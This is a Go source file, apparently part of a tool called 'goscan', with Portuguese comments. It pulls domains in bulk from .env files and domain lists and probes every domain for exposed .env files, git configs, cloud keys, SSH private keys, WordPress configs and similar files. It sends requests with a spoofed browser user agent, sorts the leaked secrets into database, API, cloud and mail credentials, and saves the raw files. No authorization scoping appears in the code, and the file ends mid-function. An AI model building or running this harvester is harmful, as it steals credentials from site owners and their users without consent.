package scanner

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"goscan/internal/paths"
	"goscan/internal/store"
)

const userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

// appLog é nosso logger; o log padrão fica silenciado (net/http usa ele e polui o terminal).
var appLog = log.New(os.Stderr, "", log.LstdFlags)

// ============================================================================
// TYPES & CONFIGURATION
// ============================================================================

type Config struct {
	Dir          string
	Output       string
	DBPath       string
	FindingsDir  string
	RunID        string
	RepoRoot     string
	Threads      int
	PathWorkers  int
	Fast         bool
	Rescan       bool
	ScanVulns    bool
	SaveContent  bool
	Timeout      time.Duration
	OnProgress   func(Stats)
	OnFound      func(VulnResult)
}

type VulnResult struct {
	URL            string
	Path           string
	Domain         string
	StatusCode     int
	FileType       string
	FileSize       int64
	Found          bool
	Timestamp      time.Time
	Filename       string
	Confidence     string // "HIGH", "MEDIUM", "LOW"
	ExtraInfo      string // Info adicional (ex: repo privado, credenciais)
	HasCredentials bool   // Se contém credenciais
	IsPrivate      bool   // Se é repositório privado
}

type Stats struct {
	FilesProcessed  int64
	LinesProcessed  int64
	DomainsFound    int64
	DomainsSkipped  int64
	DomainsScanSkip int64
	DomainsNew      int64
	DomainsPending  int64
	VulnsFound      int64
	DomainsScanned  int64
	StartTime       time.Time
}

// PhpInfo contém informações extraídas do phpinfo()
type PhpInfo struct {
	Version         string
	DocumentRoot    string
	ServerIP        string
	ServerName      string
	User            string
	PHPIniPath      string
	Extensions      []string
	Vulnerabilities []string
	RiskySettings   map[string]string
}

// EnvCredentials contém credenciais extraídas de arquivos .env
type EnvCredentials struct {
	DatabaseCreds map[string]string
	APICreds      map[string]string
	CloudCreds    map[string]string
	MailCreds     map[string]string
	AppSecrets    map[string]string
	OtherSecrets  map[string]string
}

// ============================================================================
// GLOBAL VARIABLES
// ============================================================================

var (
	reDomain = regexp.MustCompile(`(?i)([a-z0-9][-a-z0-9]*\.)+[a-z]{2,}`)
	reURL    = regexp.MustCompile(`(?i)https?://([a-z0-9][-a-z0-9]*\.)+[a-z]{2,}(?::\d+)?(?:/[^\s<>"']*)?`)
	reEmail  = regexp.MustCompile(`@([a-z0-9][-a-z0-9]*\.[a-z0-9][-a-z0-9]*\.[a-z]{2,}|[a-z0-9][-a-z0-9]*\.[a-z]{2,})`)

	httpClient    *http.Client
	findingsStore *store.FindingsStore
	runID         string
	currentCfg    *Config

	priorityPaths = []string{
		"/.env",
		"/.env.local",
		"/.env.production",
		"/.env.prod",
		"/.env.backup",
		"/.env.save",
	}

	criticalPaths = []string{
		// Environment files - variações comuns
		"/.env",
		"/.env.local",
		"/.env.production",
		"/.env.development",
		"/.env.staging",
		"/.env.backup",
		"/.env.bak",
		"/.env.save",
		"/.env.dev",
		"/.env.prod",
		"/.env.dist",
		"/env",
		"/app/.env",
		"/api/.env",
		"/backend/.env",
		"/config/.env",
		"/src/.env",
		"/public/.env",
		"/web/.env",
	}
)

// ============================================================================
// MAIN
// ============================================================================

// Run executes ingest and optional vulnerability scan.
func Run(ctx context.Context, cfg *Config) error {
	log.SetOutput(io.Discard)
	initHTTPClient(cfg.Timeout)

	if cfg.RunID == "" {
		cfg.RunID = time.Now().Format("20060102_150405")
	}
	runID = cfg.RunID

	findingsDir := cfg.FindingsDir
	if findingsDir == "" && cfg.RepoRoot != "" {
		findingsDir = paths.FindingsRoot(cfg.RepoRoot)
	}
	if findingsDir == "" {
		findingsDir = "var/findings"
	}
	if err := os.MkdirAll(filepath.Join(findingsDir, "by-domain"), 0755); err != nil {
		return fmt.Errorf("criar diretório findings: %w", err)
	}

	printBanner()
	appLog.Printf("📁 Findings: %s (run %s)\n", findingsDir, runID)

	domainStore, err := store.OpenDomainStore(cfg.DBPath)
	if err != nil {
		return fmt.Errorf("abrir SQLite: %w", err)
	}
	defer domainStore.Close()

	fs, err := store.OpenFindingsStore(domainStore.DB(), findingsDir)
	if err != nil {
		return fmt.Errorf("findings store: %w", err)
	}
	findingsStore = fs
	currentCfg = cfg

	appLog.Printf("💾 %s — %d total | %d scaneados | %d pendentes\n",
		cfg.DBPath, domainStore.Count(), domainStore.ScannedCount(), domainStore.PendingCount())

	appLog.Println("📁 Escaneando .env / listas .txt...")
	files := findInputFiles(cfg.Dir)
	if len(files) == 0 {
		return fmt.Errorf("nenhum arquivo de entrada encontrado (.env ou .txt)")
	}
	appLog.Printf("✅ %d arquivo(s) encontrado(s)\n", len(files))

	stats := &Stats{StartTime: time.Now()}

	if cfg.OnProgress != nil {
		go func() {
			ticker := time.NewTicker(500 * time.Millisecond)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					cfg.OnProgress(*stats)
				}
			}
		}()
	}

	if cfg.ScanVulns {
		printSeparator()
		appLog.Println("🔬 INGESTÃO + SCAN (novos + pendentes, skip scaneados)")
		printSeparator()
		runIngestAndScan(ctx, files, cfg, domainStore, stats)
	} else {
		appLog.Printf("\n🔍 Ingestão de domínios (sem scan)...\n")
		runIngestOnly(ctx, files, domainStore, stats)
	}

	domainStore.Flush()

	total := domainStore.Count()
	if total == 0 && atomic.LoadInt64(&stats.DomainsNew) == 0 {
		appLog.Println("❌ Nenhum domínio válido encontrado")
		if len(files) > 0 {
			debugFile(files[0])
		}
		return nil
	}

	exportDir := filepath.Join(findingsDir, "exports")
	if atomic.LoadInt64(&stats.DomainsNew) > 0 {
		_ = os.MkdirAll(exportDir, 0755)
		if err := domainStore.ExportTXT(filepath.Join(exportDir, "dominios_unicos.txt")); err != nil {
			appLog.Printf("⚠️  Erro ao exportar dominios_unicos.txt: %v", err)
		}
	} else {
		appLog.Println("ℹ️  Nenhum domínio novo — export .txt ignorado")
	}

	printIngestStats(stats, total)
	printFinalSummary(findingsDir, cfg.SaveContent)
	return nil
}

// ============================================================================
// INITIALIZATION
// ============================================================================

func initHTTPClient(timeout time.Duration) {
	dialer := &net.Dialer{
		Timeout:   4 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	transport := &http.Transport{
		DialContext:           dialer.DialContext,
		MaxIdleConns:          512,
		MaxIdleConnsPerHost:   32,
		MaxConnsPerHost:       32,
		DisableKeepAlives:     false,
		ForceAttemptHTTP2:     false,
		IdleConnTimeout:       30 * time.Second,
		TLSHandshakeTimeout:   5 * time.Second,
		ResponseHeaderTimeout: timeout,
	}

	httpClient = &http.Client{
		Timeout:   timeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

// ============================================================================
// FILE DISCOVERY
// ============================================================================

func isEnvFile(path string) bool {
	base := strings.ToLower(filepath.Base(path))
	if base == "env" || strings.HasPrefix(base, ".env") {
		return true
	}
	return strings.ToLower(filepath.Ext(path)) == ".env"
}

func isDomainListFile(path string) bool {
	return strings.ToLower(filepath.Ext(path)) == ".txt" && !isEnvFile(path)
}

func isInputFile(path string) bool {
	return isEnvFile(path) || isDomainListFile(path)
}

func findInputFiles(rootDir string) []string {
	var files []string

	err := filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		if info.Size() == 0 {
			return nil
		}
		if !isInputFile(path) {
			return nil
		}
		// .env: limite 50MB; listas .txt: sem limite (leitura streaming)
		if isEnvFile(path) && info.Size() > 50*1024*1024 {
			return nil
		}
		files = append(files, path)
		return nil
	})

	if err != nil {
		appLog.Printf("⚠️  Erro ao escanear arquivos: %v", err)
	}

	return files
}

// ============================================================================
// INGESTÃO + PIPELINE
// ============================================================================

// processDomain decide ingestão e se o domínio entra na fila de scan.
// scanMode=false: só insere novos no DB.
// scanMode=true: enfileira novos + pendentes (sem scanned_at); skip scaneados salvo -rescan.
func processDomain(domain, source string, store *store.DomainStore, stats *Stats, scanMode, rescan bool) bool {
	if store.Exists(domain) {
		if scanMode {
			if store.IsScanned(domain) && !rescan {
				atomic.AddInt64(&stats.DomainsScanSkip, 1)
				return false
			}
			atomic.AddInt64(&stats.DomainsPending, 1)
			return true
		}
		atomic.AddInt64(&stats.DomainsSkipped, 1)
		return false
	}
	if store.InsertIfNew(domain, source) {
		atomic.AddInt64(&stats.DomainsNew, 1)
		atomic.AddInt64(&stats.DomainsFound, 1)
		return scanMode
	}
	atomic.AddInt64(&stats.DomainsSkipped, 1)
	return false
}

func runIngestOnly(ctx context.Context, files []string, store *store.DomainStore, stats *Stats) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	go reportIngestProgress(ctx, stats)

	for _, path := range files {
		select {
		case <-ctx.Done():
			return
		default:
		}
		if isDomainListFile(path) {
			ingestDomainList(path, store, stats, nil, false)
		} else {
			ingestEnvFile(path, store, stats, nil, false)
		}
		atomic.AddInt64(&stats.FilesProcessed, 1)
	}
	fmt.Fprintln(os.Stderr)
}

func runIngestAndScan(ctx context.Context, files []string, cfg *Config, domainStore *store.DomainStore, stats *Stats) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	scanQueue := make(chan string, cfg.Threads*4)
	results := make(chan VulnResult, 1000)

	var saveWg sync.WaitGroup
	saveWg.Add(1)
	go func() {
		defer saveWg.Done()
		logVulnResults(results)
	}()

	scannedCh := make(chan string, cfg.Threads*4)

	var batchWg sync.WaitGroup
	batchWg.Add(1)
	go func() {
		defer batchWg.Done()
		domainStore.RunScannedBatcher(scannedCh)
	}()

	paths := criticalPaths
	if cfg.Fast {
		paths = priorityPaths
	}

	var scanWg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		scanWg.Add(1)
		go func() {
			defer scanWg.Done()
			for domain := range scanQueue {
				found := scanDomain(domain, paths, cfg.PathWorkers, results, cfg.SaveContent)
				if found > 0 {
					atomic.AddInt64(&stats.VulnsFound, int64(found))
				}
				scannedCh <- domain
				atomic.AddInt64(&stats.DomainsScanned, 1)
			}
		}()
	}

	go reportPipelineProgress(ctx, stats)

	for _, path := range files {
		select {
		case <-ctx.Done():
			close(scanQueue)
			scanWg.Wait()
			close(scannedCh)
			batchWg.Wait()
			close(results)
			saveWg.Wait()
			return
		default:
		}
		if isDomainListFile(path) {
			ingestDomainList(path, domainStore, stats, scanQueue, cfg.Rescan)
		} else {
			ingestEnvFile(path, domainStore, stats, scanQueue, cfg.Rescan)
		}
		atomic.AddInt64(&stats.FilesProcessed, 1)
	}

	close(scanQueue)
	scanWg.Wait()
	close(scannedCh)
	batchWg.Wait()
	close(results)
	saveWg.Wait()
	fmt.Fprintln(os.Stderr)
}

func ingestDomainList(path string, store *store.DomainStore, stats *Stats, scanQueue chan<- string, rescan bool) {
	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	buf := make([]byte, 64*1024)
	scanner.Buffer(buf, 1024*1024)

	for scanner.Scan() {
		atomic.AddInt64(&stats.LinesProcessed, 1)
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		d := cleanDomain(line)
		if !isValidDomain(d) {
			continue
		}
		scanMode := scanQueue != nil
		if processDomain(d, path, store, stats, scanMode, rescan) && scanQueue != nil {
			scanQueue <- d
		}
	}
}

func ingestEnvFile(path string, store *store.DomainStore, stats *Stats, scanQueue chan<- string, rescan bool) {
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}

	content := string(data)
	seen := make(map[string]bool)

	add := func(d string) {
		if !isValidDomain(d) || seen[d] {
			return
		}
		seen[d] = true
		scanMode := scanQueue != nil
		if processDomain(d, path, store, stats, scanMode, rescan) && scanQueue != nil {
			scanQueue <- d
		}
	}

	for _, url := range reURL.FindAllString(content, -1) {
		if domain := extractDomain(url); domain != "" {
			add(domain)
		}
	}
	for _, d := range reDomain.FindAllString(content, -1) {
		add(cleanDomain(d))
	}
	for _, match := range reEmail.FindAllStringSubmatch(content, -1) {
		if len(match) > 1 {
			add(cleanDomain(match[1]))
		}
	}
}

func extractDomain(url string) string {
	url = strings.TrimPrefix(url, "https://")
	url = strings.TrimPrefix(url, "http://")
	url = strings.TrimPrefix(url, "//")

	if idx := strings.IndexAny(url, "/?#:"); idx != -1 {
		url = url[:idx]
	}

	return cleanDomain(url)
}

func cleanDomain(d string) string {
	d = strings.Trim(d, ":;.,()[]{}'\"` \t\n\r")
	d = strings.ToLower(d)
	d = strings.TrimPrefix(d, "www.")

	if idx := strings.Index(d, ":"); idx != -1 {
		d = d[:idx]
	}

	if idx := strings.Index(d, "/"); idx != -1 {
		d = d[:idx]
	}

	return strings.TrimSpace(d)
}

func isValidDomain(domain string) bool {
	if domain == "" || len(domain) < 4 || len(domain) > 255 {
		return false
	}

	if domain[0] >= '0' && domain[0] <= '9' {
		return false
	}

	if strings.HasPrefix(domain, ".") || strings.Contains(domain, "..") {
		return false
	}

	if !strings.Contains(domain, ".") {
		return false
	}

	if strings.ContainsAny(domain, "!@#$%&*()+={}[]|\\:;\"'<>?, ") {
		return false
	}

	parts := strings.Split(domain, ".")
	tld := parts[len(parts)-1]

	if len(tld) < 2 || len(tld) > 6 {
		return false
	}

	for _, c := range tld {
		if c < 'a' || c > 'z' {
			return false
		}
	}

	return true
}

// ============================================================================
// VULNERABILITY SCANNING (.env only)
// ============================================================================

func scanDomain(domain string, paths []string, pathWorkers int, results chan<- VulnResult, shouldSaveContent bool) int {
	for _, proto := range []string{"https", "http"} {
		baseURL := fmt.Sprintf("%s://%s", proto, domain)
		found, connected := scanPathsParallel(baseURL, domain, paths, pathWorkers, results, shouldSaveContent)
		if found > 0 || connected {
			return found
		}
	}
	return 0
}

func scanPathsParallel(baseURL, domain string, paths []string, workers int, results chan<- VulnResult, shouldSaveContent bool) (found int, connected bool) {
	if workers < 1 {
		workers = 1
	}
	sem := make(chan struct{}, workers)
	var wg sync.WaitGroup
	var foundCount atomic.Int32
	var connectedFlag atomic.Bool

	for _, path := range paths {
		wg.Add(1)
		sem <- struct{}{}
		go func(p string) {
			defer wg.Done()
			defer func() { <-sem }()

			result, ok, gotResp := testCriticalPath(baseURL+p, domain, p, shouldSaveContent)
			if gotResp {
				connectedFlag.Store(true)
			}
			if ok {
				foundCount.Add(1)
				results <- result
			}
		}(path)
	}
	wg.Wait()
	return int(foundCount.Load()), connectedFlag.Load()
}

func testCriticalPath(url, domain, path string, shouldSaveContent bool) (VulnResult, bool, bool) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return VulnResult{}, false, false
	}

	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Accept", "*/*")

	resp, err := httpClient.Do(req)
	if err != nil {
		return VulnResult{}, false, false
	}
	defer resp.Body.Close()

	gotResp := true

	if resp.StatusCode != 200 {
		io.Copy(io.Discard, io.LimitReader(resp.Body, 512))
		return VulnResult{}, false, gotResp
	}

	const peekSize = 32 * 1024
	body, err := io.ReadAll(io.LimitReader(resp.Body, peekSize))
	if err != nil {
		return VulnResult{}, false, gotResp
	}

	confidence, isValid := validateContent(path, body, resp.Header.Get("Content-Type"))
	if !isValid {
		io.Copy(io.Discard, resp.Body)
		return VulnResult{}, false, gotResp
	}

	if shouldSaveContent && confidence != "LOW" {
		if rest, err := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024-int64(len(body)))); err == nil && len(rest) > 0 {
			body = append(body, rest...)
		}
	}

	result := VulnResult{
		URL:        url,
		Path:       path,
		Domain:     domain,
		StatusCode: resp.StatusCode,
		FileType:   categorizeFile(path),
		FileSize:   int64(len(body)),
		Found:      true,
		Timestamp:  time.Now(),
		Confidence: confidence,
	}

	// Credenciais .env — info no log, sem arquivo separado
	if strings.Contains(path, ".env") || path == "/env" || strings.HasSuffix(path, "/env") {
		envCreds := extractEnvCredentials(string(body))
		credCount := 0
		var credTypes []string

		if len(envCreds.DatabaseCreds) > 0 {
			credCount += len(envCreds.DatabaseCreds)
			credTypes = append(credTypes, fmt.Sprintf("%d DB", len(envCreds.DatabaseCreds)))
			result.HasCredentials = true
		}
		if len(envCreds.APICreds) > 0 {
			credCount += len(envCreds.APICreds)
			credTypes = append(credTypes, fmt.Sprintf("%d API", len(envCreds.APICreds)))
			result.HasCredentials = true
		}
		if len(envCreds.CloudCreds) > 0 {
			credCount += len(envCreds.CloudCreds)
			credTypes = append(credTypes, fmt.Sprintf("%d Cloud", len(envCreds.CloudCreds)))
			result.HasCredentials = true
		}
		if len(envCreds.MailCreds) > 0 {
			credCount += len(envCreds.MailCreds)
			credTypes = append(credTypes, fmt.Sprintf("%d Mail", len(envCreds.MailCreds)))
		}
		if len(envCreds.AppSecrets) > 0 {
			credCount += len(envCreds.AppSecrets)
			credTypes = append(credTypes, fmt.Sprintf("%d App", len(envCreds.AppSecrets)))
			result.HasCredentials = true
		}
		if len(envCreds.OtherSecrets) > 0 {
			credCount += len(envCreds.OtherSecrets)
			credTypes = append(credTypes, fmt.Sprintf("%d Other", len(envCreds.OtherSecrets)))
			result.HasCredentials = true
		}

		if credCount > 0 {
			extra := fmt.Sprintf("🔑 %d credentials: %s", credCount, strings.Join(credTypes, ", "))
			if result.ExtraInfo != "" {
				result.ExtraInfo = result.ExtraInfo + " | " + extra
			} else {
				result.ExtraInfo = extra
			}
		}
	}

	// Salva só o .env bruto
	if shouldSaveContent && confidence != "LOW" {
		if filename := saveFileContent(domain, path, body, url, confidence, result.HasCredentials); filename != "" {
			result.Filename = filename
		}
	}

	return result, true, gotResp
}

func validateContent(path string, body []byte, contentType string) (string, bool) {
	content := string(body)
	contentLower := strings.ToLower(content)

	// ========================================================================
	// FILTRO GLOBAL: Rejeita qualquer conteúdo que pareça HTML/JavaScript
	// ========================================================================
	htmlIndicators := []string{
		"<!doctype", "<html", "<head>", "<body", "</html>", "</body>",
		"<script>", "</script>", "<div", "<form", "<title>", "<meta",
		"<link rel=", "<style>", "function()", "window.", "document.",
	}
	for _, indicator := range htmlIndicators {
		if strings.Contains(contentLower, indicator) {
			// Exceção: phpinfo() retorna HTML válido
			if strings.Contains(path, "phpinfo") || strings.Contains(path, "info.php") {
				break // Continua validação específica
			}
			return "LOW", false
		}
	}

	// ========================================================================
	// Validações específicas por tipo de arquivo
	// ========================================================================
	switch {
	case strings.Contains(path, "/.git/config"):
		return validateGitConfig(content)

	case strings.Contains(path, "/.git/HEAD"):
		content = strings.TrimSpace(content)
		// Formato: "ref: refs/heads/branch" ou hash de 40 caracteres
		if strings.HasPrefix(content, "ref: refs/") {
			return "HIGH", true
		}
		// Hash SHA1 puro (40 hex chars)
		if len(content) >= 40 && len(content) <= 41 && isHexString(content[:40]) {
			return "HIGH", true
		}

	case strings.Contains(path, ".env") || path == "/env" || strings.HasSuffix(path, "/env"):
		// Deve ter formato KEY=VALUE em múltiplas linhas
		lines := strings.Split(content, "\n")
		validEnvLines := 0
		hasSecretKey := false

		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			// Formato válido: KEY=value (KEY deve ser UPPERCASE ou snake_case)
			if idx := strings.Index(line, "="); idx > 0 {
				key := line[:idx]
				// Chave válida: letras maiúsculas, números, underscore
				if isValidEnvKey(key) {
					validEnvLines++
					// Verifica chaves sensíveis
					keyUpper := strings.ToUpper(key)
					if strings.Contains(keyUpper, "KEY") ||
						strings.Contains(keyUpper, "SECRET") ||
						strings.Contains(keyUpper, "PASSWORD") ||
						strings.Contains(keyUpper, "TOKEN") ||
						strings.Contains(keyUpper, "DB_") ||
						strings.Contains(keyUpper, "DATABASE") ||
						strings.Contains(keyUpper, "AWS_") ||
						strings.Contains(keyUpper, "API_") ||
						strings.Contains(keyUpper, "REDIS_") ||
						strings.Contains(keyUpper, "MONGO") ||
						strings.Contains(keyUpper, "MYSQL") ||
						strings.Contains(keyUpper, "POSTGRES") ||
						strings.Contains(keyUpper, "MAIL_") ||
						strings.Contains(keyUpper, "SMTP_") ||
						strings.Contains(keyUpper, "S3_") ||
						strings.Contains(keyUpper, "STRIPE_") ||
						strings.Contains(keyUpper, "PUSHER_") ||
						strings.Contains(keyUpper, "TWILIO") ||
						strings.Contains(keyUpper, "SENDGRID") ||
						strings.Contains(keyUpper, "PRIVATE") ||
						strings.Contains(keyUpper, "CREDENTIAL") {
						hasSecretKey = true
					}
				}
			}
		}

		// Mais flexível: 3 linhas válidas + chave secreta = alto valor
		if validEnvLines >= 5 && hasSecretKey {
			return "HIGH", true
		}
		if validEnvLines >= 3 && hasSecretKey {
			return "HIGH", true
		}
		// Mesmo sem chave secreta, muitas variáveis de ambiente são úteis
		if validEnvLines >= 8 {
			return "MEDIUM", true
		}

	case strings.Contains(path, "env.php"):
		// Laravel env.php retorna array PHP
		if strings.Contains(content, "<?php") && strings.Contains(content, "return") &&
			(strings.Contains(contentLower, "password") ||
				strings.Contains(contentLower, "key") ||
				strings.Contains(contentLower, "secret")) {
			return "HIGH", true
		}

	case strings.Contains(path, "env.json"):
		// JSON com variáveis de ambiente
		if strings.HasPrefix(strings.TrimSpace(content), "{") &&
			(strings.Contains(contentLower, "password") ||
				strings.Contains(contentLower, "secret") ||
				strings.Contains(contentLower, "api_key")) {
			return "HIGH", true
		}

	case strings.Contains(path, "/.aws/credentials"):
		if strings.Contains(content, "[default]") &&
			strings.Contains(content, "aws_access_key_id") &&
			strings.Contains(content, "aws_secret_access_key") {
			return "HIGH", true
		}

	case strings.Contains(path, "/.ssh/id_rsa") ||
		strings.Contains(path, "/.ssh/id_dsa") ||
		strings.Contains(path, "/.ssh/id_ecdsa"):
		if strings.Contains(content, "-----BEGIN") &&
			strings.Contains(content, "PRIVATE KEY-----") &&
			strings.Contains(content, "-----END") {
			return "HIGH", true
		}

	case strings.Contains(path, "wp-config.php"):
		// Deve ter estrutura PHP com defines do WordPress
		if strings.Contains(content, "<?") &&
			strings.Contains(content, "DB_NAME") &&
			strings.Contains(content, "DB_USER") &&
			strings.Contains(content, "DB_PASSWORD") {
			return "HIGH", true
		}

	case strings.Contains(path, "phpinfo.php") || strings.Contains(path, "info.php"):
		// phpinfo() gera HTML específico com tabelas de configuração
		if strings.Contains(contentLower, "<title>php") &&
			strings.Contains(contentLower, "php version") &&
			strings.Contains(contentLower, "configuration") &&
			strings.Contains(contentLower, "php.ini") {
			return "HIGH", true
		}

	case strings.Contains(path, ".sql"):
		// Deve conter comandos SQL reais
		sqlPatterns := 0
		if strings.Contains(contentLower, "create table") {
			sqlPatterns++
		}
		if strings.Contains(contentLower, "insert into") {
			sqlPatterns++
		}
		if strings.Contains(contentLower, "drop table") {
			sqlPatterns++
		}
		if strings.Contains(contentLower, "alter table") {
			sqlPatterns++
		}
		if sqlPatterns >= 2 {
			return "HIGH", true
		}

	case strings.Contains(path, "backup.zip") || strings.Contains(path, "site-backup.zip"):
		// Verifica magic bytes de ZIP
		if len(body) > 4 && body[0] == 0x50 && body[1] == 0x4B && body[2] == 0x03 && body[3] == 0x04 {
			return "HIGH", true
		}

	case strings.Contains(path, ".tar.gz"):
		// Verifica magic bytes de GZIP
		if len(body) > 2 && body[0] == 0x1F && body[1] == 0x8B {
			return "HIGH", true
		}

	case strings.Contains(path, "database.yml"):
		// Rails database.yml deve ter estrutura YAML específica
		if strings.Contains(content, "adapter:") &&
			strings.Contains(content, "database:") &&
			(strings.Contains(content, "password:") || strings.Contains(content, "username:")) {
			return "HIGH", true
		}

	case strings.Contains(path, "credentials.json") || strings.Contains(path, "service-account.json"):
		// Google Cloud service account JSON
		if strings.Contains(content, "\"type\":") &&
			strings.Contains(content, "\"private_key\":") &&
			strings.Contains(content, "\"client_email\":") {
			return "HIGH", true
		}

	case strings.Contains(path, ".htpasswd"):
		// Se for JSON ou HTML, é falso positivo (ex: mensagem de erro JSON)
		if strings.HasPrefix(strings.TrimSpace(content), "{") ||
			strings.HasPrefix(strings.TrimSpace(content), "[") ||
			strings.HasPrefix(contentLower, "<!doctype") ||
			strings.HasPrefix(contentLower, "<html") {
			return "LOW", false
		}
		// Formato: user:password_hash (htpasswd real)
		// Hash típicos: $apr1$..., $2y$..., {SHA}..., ou hash DES/MD5
		lines := strings.Split(content, "\n")
		validLines := 0
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
				parts := strings.SplitN(line, ":", 2)
				if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) >= 8 {
					hash := parts[1]
					// Verificar se parece um hash válido
					if strings.HasPrefix(hash, "$apr1$") ||
						strings.HasPrefix(hash, "$2y$") ||
						strings.HasPrefix(hash, "$2a$") ||
						strings.HasPrefix(hash, "$2b$") ||
						strings.HasPrefix(hash, "$1$") ||
						strings.HasPrefix(hash, "$5$") ||
						strings.HasPrefix(hash, "$6$") ||
						strings.HasPrefix(hash, "{SHA}") ||
						(len(hash) >= 13 && !strings.Contains(hash, " ") && !strings.Contains(hash, "{")) {
						validLines++
					}
				}
			}
		}
		if validLines >= 1 {
			return "HIGH", true
		}

	case strings.Contains(path, ".npmrc"):
		// Deve conter token de autenticação
		if strings.Contains(content, "_authToken=") ||
			strings.Contains(content, "_auth=") ||
			strings.Contains(content, "//registry.") {
			return "HIGH", true
		}

	case strings.Contains(path, "debug.log") || strings.Contains(path, "error.log") || strings.Contains(path, "laravel.log"):
		// Logs devem ter timestamps e stack traces
		if (strings.Contains(content, "[") && strings.Contains(content, "]")) &&
			(strings.Contains(contentLower, "error") ||
				strings.Contains(contentLower, "exception") ||
				strings.Contains(contentLower, "warning") ||
				strings.Contains(contentLower, "stack trace")) {
			return "MEDIUM", true
		}
	}

	return "LOW", false
}

// isHexString verifica se uma string contém apenas caracteres hexadecimais
func isHexString(s string) bool {
	for _, c := range s {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

// isValidEnvKey verifica se é uma chave de variável de ambiente válida
func isValidEnvKey(key string) bool {
	if len(key) == 0 {
		return false
	}
	for i, c := range key {
		if i == 0 && c >= '0' && c <= '9' {
			return false // Não pode começar com número
		}
		if !((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '_') {
			return false
		}
	}
	return true
}

// GitInfo contém informações extraídas do .git/config
type GitInfo struct {
	IsValid        bool
	HasCredentials bool
	IsPrivate      bool
	RemoteURL      string
	Username       string
	Platform       string // github, gitlab, bitbucket, etc
	RepoName       string
	Description    string
}

// validateGitConfig valida e extrai informações do .git/config
func validateGitConfig(content string) (string, bool) {
	// Deve conter estrutura básica de config git
	if !strings.Contains(content, "[core]") {
		return "LOW", false
	}
	if !strings.Contains(content, "repositoryformatversion") {
		return "LOW", false
	}

	return "HIGH", true
}

// analyzeGitConfig extrai informações detalhadas do .git/config
func analyzeGitConfig(content string) GitInfo {
	info := GitInfo{IsValid: true}

	// Regex para extrair URL do remote
	reRemoteURL := regexp.MustCompile(`url\s*=\s*(.+)`)

	lines := strings.Split(content, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)

		// Extrai URL do remote
		if matches := reRemoteURL.FindStringSubmatch(line); len(matches) > 1 {
			url := strings.TrimSpace(matches[1])
			info.RemoteURL = url
			info.Platform, info.RepoName = parseGitURL(url)
			info.HasCredentials, info.Username = checkGitCredentials(url)

			// Verifica se é repositório privado (baseado na URL)
			if strings.Contains(url, "@") || strings.HasPrefix(url, "git@") {
				info.IsPrivate = true
			}
		}
	}

	// Monta descrição
	var parts []string
	if info.Platform != "" {
		parts = append(parts, info.Platform)
	}
	if info.RepoName != "" {
		parts = append(parts, info.RepoName)
	}
	if info.HasCredentials {
		parts = append(parts, "🔑CREDENCIAIS")
	}
	if info.IsPrivate {
		parts = append(parts, "🔒PRIVADO")
	}
	info.Description = strings.Join(parts, " | ")

	return info
}

// parseGitURL extrai plataforma e nome do repositório da URL
func parseGitURL(url string) (platform, repoName string) {
	url = strings.TrimSpace(url)

	// Remove .git do final
	url = strings.TrimSuffix(url, ".git")

	// Detecta plataforma
	switch {
	case strings.Contains(url, "github.com"):
		platform = "GitHub"
	case strings.Contains(url, "gitlab.com"):
		platform = "GitLab"
	case strings.Contains(url, "bitbucket.org"):
		platform = "Bitbucket"
	case strings.Contains(url, "azure.com") || strings.Contains(url, "visualstudio.com"):
		platform = "Azure DevOps"
	case strings.Contains(url, "gitee.com"):
		platform = "Gitee"
	default:
		platform = "Git"
	}

	// Extrai nome do repositório
	// Formato SSH: git@github.com:user/repo.git
	if strings.Contains(url, ":") && strings.HasPrefix(url, "git@") {
		parts := strings.Split(url, ":")
		if len(parts) > 1 {
			repoName = parts[1]
		}
	} else {
		// Formato HTTPS: https://github.com/user/repo.git
		// ou https://user:pass@github.com/user/repo.git
		if idx := strings.Index(url, "://"); idx != -1 {
			url = url[idx+3:]
		}
		// Remove credenciais se existirem
		if idx := strings.Index(url, "@"); idx != -1 {
			url = url[idx+1:]
		}
		// Pega o path
		if idx := strings.Index(url, "/"); idx != -1 {
			repoName = url[idx+1:]
		}
	}

	return platform, repoName
}

// checkGitCredentials verifica se há credenciais na URL
func checkGitCredentials(url string) (hasCredentials bool, username string) {
	url = strings.TrimSpace(url)

	// Formato: https://username:password@host/path
	// ou: https://username@host/path
	if strings.Contains(url, "://") {
		// Remove o protocolo
		afterProtocol := url[strings.Index(url, "://")+3:]

		// Verifica se tem @ (credenciais)
		if idx := strings.Index(afterProtocol, "@"); idx != -1 {
			credentials := afterProtocol[:idx]
			hasCredentials = true

			// Extrai username
			if colonIdx := strings.Index(credentials, ":"); colonIdx != -1 {
				username = credentials[:colonIdx]
			} else {
				username = credentials
			}
		}
	}

